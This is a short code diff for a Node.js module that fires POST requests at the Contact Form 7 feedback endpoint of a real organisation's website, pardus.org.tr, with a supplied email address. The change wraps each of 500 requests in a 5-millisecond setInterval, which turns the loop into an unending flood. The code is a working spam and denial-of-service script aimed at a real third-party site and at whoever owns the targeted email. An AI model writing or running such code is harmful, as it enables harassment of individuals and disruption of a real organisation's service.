@@ -2,6 +2,7 @@ const fetch = require("node-fetch")
 
 module.exports = (email) => {
   for(let i = 0; i < 500; i++){
+    setInterval(() => {
       fetch("https://www.pardus.org.tr/wp-json/contact-form-7/v1/contact-forms/18514/feedback", {
     "headers": {
       "accept": "application/json, */*;q=0.1",
@@ -23,6 +24,7 @@ module.exports = (email) => {
     "mode": "cors",
     "credentials": "include"
   }).then(res => res.text()).then(data => console.log(data))
-  }
+    },5)
+}
 
 }
